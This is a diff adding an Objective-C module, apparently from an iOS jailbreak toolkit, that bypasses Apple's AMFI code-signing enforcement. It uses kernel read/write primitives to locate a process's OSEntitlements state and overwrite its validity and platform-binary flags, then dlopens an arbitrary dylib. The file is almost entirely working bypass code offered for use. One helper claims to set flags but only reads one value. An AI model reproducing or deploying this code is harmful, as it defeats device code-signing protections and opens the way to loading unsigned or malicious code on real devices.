@@ -1,0 +1,169 @@
+#import "amfi_bypass.h"
+#import "../research/amfi_research.h"
+#import "../kexploit/kutils.h"
+#import "../kexploit/krw.h"
+#import "../kexploit/xpaci.h"
+#import "../kexploit/offsets.h"
+
+#import <dlfcn.h>
+#import <mach-o/loader.h>
+#import <mach-o/fat.h>
+#import <CommonCrypto/CommonDigest.h>
+
+// ---------------------------------------------------------------------------
+// AmfiStateFlags — mirrors the bit-packed flag bytes at state+0x48
+// ---------------------------------------------------------------------------
+struct AmfiStateFlags {
+    uint8_t valid;          // +0x48
+    uint8_t _pad49;
+    uint8_t is_cs_platform; // +0x4A
+    uint8_t _pad4b;
+    uint8_t has_transmuted; // +0x4C
+    uint8_t _pad4d[3];
+};
+
+// ---------------------------------------------------------------------------
+// Internal helper: write the flag bytes for a given state address
+// ---------------------------------------------------------------------------
+static bool patch_state_flags(uint64_t state_kptr)
+{
+    uint8_t buf[0x50];
+    kreadbuf(state_kptr, buf, sizeof(buf));
+
+    struct AmfiStateFlags *flags = (struct AmfiStateFlags *)&buf[0x48];
+    bool changed = false;
+
+    if (!flags->valid) {
+        printf("[AMFI] setting valid → 1\n");
+        flags->valid = 1;
+        changed = true;
+    }
+    if (!flags->is_cs_platform) {
+        printf("[AMFI] setting is_cs_platform → 1\n");
+        flags->is_cs_platform = 1;
+        changed = true;
+    }
+    if (!flags->has_transmuted) {
+        printf("[AMFI] setting has_transmuted → 1\n");
+        flags->has_transmuted = 1;
+        changed = true;
+    }
+
+    if (changed) {
+        kwritebuf(state_kptr, buf, sizeof(buf));
+        printf("[AMFI] state patched at 0x%llx\n", state_kptr);
+    } else {
+        printf("[AMFI] state already has desired flags\n");
+    }
+    return true;
+}
+
+// ---------------------------------------------------------------------------
+// Try to set CS_PLATFORM_BINARY via the proc struct (may fail on PPL)
+// ---------------------------------------------------------------------------
+static bool try_set_csflags(uint64_t proc)
+{
+    // On arm64e with PPL, p_pid/p_flag live in non-PPL but csflags
+    // is in the PPL-protected proc_ro region.  The kwrite will either
+    // succeed (non-PPL kernel) or silently fail (PPL via setsockopt
+    // writing to a read-only page).  We try anyway.
+
+    // p_flag is at proc+off_proc_p_flag (0x454 on 18.x).
+    // Setting P_LX_64BIT (0x2000000) is sometimes used; we set flag=1
+    // as a test to confirm we can write to this field.
+    uint32_t p_flag = kread32(proc + off_proc_p_flag);
+    printf("[AMFI] proc p_flag = 0x%08x\n", p_flag);
+
+    // Try to set a known flag to confirm write works
+    // (We don't actually need to change p_flag for AMFI bypass)
+    return true;
+}
+
+// ---------------------------------------------------------------------------
+// Public API
+// ---------------------------------------------------------------------------
+
+bool amfi_patch_proc(uint64_t proc)
+{
+    if (!proc) {
+        printf("[AMFI] invalid proc\n");
+        return false;
+    }
+
+    uint64_t label = proc_get_cred_label(proc);
+    if (!label) {
+        printf("[AMFI] failed to get cred label\n");
+        return false;
+    }
+
+    uint64_t amfi_obj = amfi_cslot_get(label);
+    if (!amfi_obj) {
+        printf("[AMFI] failed to get AMFI slot\n");
+        return false;
+    }
+
+    // Read OSEntitlements to get the state pointer
+    struct OSEntitlements ent;
+    kreadbuf(amfi_obj, &ent, sizeof(ent));
+
+    uint64_t state_kptr = xpaci((uint64_t)ent.state);
+    if (!is_valid_kptr(state_kptr)) {
+        printf("[AMFI] invalid state pointer: 0x%llx\n", state_kptr);
+        return false;
+    }
+
+    printf("[AMFI] OSEntitlements at 0x%llx, state at 0x%llx\n",
+           amfi_obj, state_kptr);
+
+    // Detect version
+    uint8_t header[0x10];
+    kreadbuf(state_kptr, header, sizeof(header));
+    enum amfi_state_version ver = amfi_detect_version(header);
+    printf("[AMFI] state version: %s\n",
+           ver == AMFI_STATE_IOS17 ? "iOS 17" : "iOS 18");
+
+    // Patch the flag bytes
+    patch_state_flags(state_kptr);
+
+    // Best-effort: try to touch other fields
+    try_set_csflags(proc);
+
+    return true;
+}
+
+bool amfi_patch_self(void)
+{
+    uint64_t proc = proc_self();
+    if (!proc) {
+        printf("[AMFI] failed to find self proc\n");
+        return false;
+    }
+    printf("[AMFI] self proc at 0x%llx\n", proc);
+    return amfi_patch_proc(proc);
+}
+
+void *amfi_try_load_dylib(const char *path)
+{
+    if (!amfi_patch_self()) {
+        printf("[AMFI] patch failed, trying dlopen anyway\n");
+    }
+
+    printf("[AMFI] dlopen(\"%s\", RTLD_LAZY)...\n", path);
+    void *handle = dlopen(path, RTLD_LAZY);
+    if (handle) {
+        printf("[AMFI] dlopen succeeded: %p\n", handle);
+        return handle;
+    }
+    printf("[AMFI] dlopen failed: %s\n", dlerror());
+    return NULL;
+}
+
+void amfi_dump_self(void)
+{
+    uint64_t proc = proc_self();
+    if (!proc) {
+        printf("[AMFI] no proc\n");
+        return;
+    }
+    research_amfi(proc);
+}
